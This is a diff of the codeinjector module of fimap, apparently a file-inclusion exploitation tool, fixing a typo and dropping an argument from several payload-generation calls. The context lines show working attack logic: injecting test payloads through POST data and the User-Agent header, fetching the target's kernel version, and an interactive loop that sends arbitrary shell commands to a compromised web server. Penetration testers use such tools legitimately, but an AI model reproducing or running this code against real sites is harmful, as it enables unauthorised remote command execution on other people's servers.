@@ -106,7 +106,7 @@ class codeinjector(baseClass):
                 else:
                     postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
             else:
-                print "fimap is currently not configured to exploit RFI vulnerabilitys."
+                print "fimap is currently not configured to exploit RFI vulnerabilities."
                 sys.exit(1)
 
 
@@ -131,7 +131,7 @@ class codeinjector(baseClass):
                     name = item.getName()
                     payload = None
                     self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                    testload = item.generatePayload(shell_test_code, True)
+                    testload = item.generatePayload(shell_test_code)
                     if (mode.find("A") != -1):
                         self.setUserAgent(testload)
                         code = self.doPostRequest(url, postdata)
@@ -152,7 +152,7 @@ class codeinjector(baseClass):
                         self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
-                            uname_cmd = item.generatePayload(xml2config.getKernelCode(), True)
+                            uname_cmd = item.generatePayload(xml2config.getKernelCode())
                             kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix).strip()
                             self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
@@ -171,7 +171,7 @@ class codeinjector(baseClass):
                     if (attack == "fimap_shell"):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
-                        pwd_cmd = item.generatePayload("pwd", True)
+                        pwd_cmd = item.generatePayload("pwd")
                         curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
                         print shell_banner
 
@@ -180,11 +180,11 @@ class codeinjector(baseClass):
                             if cmd == "q" or cmd == "quit": break
                             
                             if (cmd.strip() != ""):
-                                userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd), True)
+                                userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd))
                                 code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
-                                    cmd = item.generatePayload(cmd, True)
+                                    cmd = item.generatePayload(cmd)
                                     curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
@@ -200,7 +200,7 @@ class codeinjector(baseClass):
                     if (not attack.doInShell()):
                         shellcode = cpayload
                     else:
-                        shellcode = item.generatePayload(cpayload, True)
+                        shellcode = item.generatePayload(cpayload)
 
 
                     code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix)
